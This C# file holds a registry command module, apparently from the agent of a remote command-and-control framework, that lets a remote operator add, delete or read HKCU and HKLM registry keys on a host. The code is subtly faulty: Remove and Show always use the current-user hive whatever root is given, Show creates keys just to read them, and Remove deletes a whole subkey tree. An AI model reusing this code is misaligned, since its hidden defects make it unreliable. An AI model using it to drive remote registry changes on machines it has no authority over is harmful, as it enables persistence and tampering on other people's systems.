using Agent.Commands.Services;
using Agent.Models;
using Microsoft.Win32;
using Shared;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class RegCommand : ServiceCommand
    {
        public override CommandId Command => CommandId.Reg;

        protected override void RegisterVerbs()
        {
            base.RegisterVerbs();
            this.Register(CommandVerbs.Add, this.Add);
            this.Register(CommandVerbs.Remove, this.Remove);
        }


        protected async Task Add(AgentTask task, AgentCommandContext context)
        {
            task.ThrowIfParameterMissing(ParameterId.Path);
            task.ThrowIfParameterMissing(ParameterId.Key);
            task.ThrowIfParameterMissing(ParameterId.Value);

            var path = task.GetParameter<string>(ParameterId.Path);
            var key = task.GetParameter<string>(ParameterId.Key);
            var value = task.GetParameter<string>(ParameterId.Value);

            RegistryKey rootKey = null;
            if(path.ToUpper().StartsWith("HKCU\\"))
                rootKey =  Registry.CurrentUser;
            if (path.ToUpper().StartsWith("HKLM\\"))
                rootKey =  Registry.LocalMachine;

            if (rootKey == null)
            {
                context.Error("Invalid Key");
                return;
            }

            path = path.Substring(5, path.Length - 5);

            var rk = rootKey.CreateSubKey(path);
            rk.SetValue(key, value, RegistryValueKind.String);
            rk.Close();

            context.AppendResult($"Key successfully created");
        }

        protected async Task Remove(AgentTask task, AgentCommandContext context)
        {
            task.ThrowIfParameterMissing(ParameterId.Key);
            task.ThrowIfParameterMissing(ParameterId.Path);

            var key = task.GetParameter<string>(ParameterId.Key);
            var path = task.GetParameter<string>(ParameterId.Path);
            

            RegistryKey rootKey = null;
            if (path.ToUpper().StartsWith("HKCU\\"))
                rootKey =  Registry.CurrentUser;
            if (path.ToUpper().StartsWith("HKLM\\"))
                rootKey =  Registry.LocalMachine;

            if (rootKey == null)
            {
                context.Error("Invalid Key");
                return;
            }

            path = path.Substring(5, path.Length - 5);

            RegistryKey rk = Registry.CurrentUser.CreateSubKey(path);
            rk.DeleteSubKeyTree(key);
            rk.Close();

            context.AppendResult($"Key removed");
        }

        protected override async Task Show(AgentTask task, AgentCommandContext context)
        {
            task.ThrowIfParameterMissing(ParameterId.Key);
            task.ThrowIfParameterMissing(ParameterId.Path);

            var key = task.GetParameter<string>(ParameterId.Key);
            var path = task.GetParameter<string>(ParameterId.Path);


            RegistryKey rootKey = null;
            if (path.ToUpper().StartsWith("HKCU\\"))
                rootKey =  Registry.CurrentUser;
            if (path.ToUpper().StartsWith("HKLM\\"))
                rootKey =  Registry.LocalMachine;

            if (rootKey == null)
            {
                context.Error("Invalid Key");
                return;
            }

            path = path.Substring(5, path.Length - 5);

            RegistryKey rk = Registry.CurrentUser.CreateSubKey(path);
            var value = rk.GetValue(key).ToString();
            rk.Close();

            context.AppendResult($"Value is {value}");
        }
    }
}
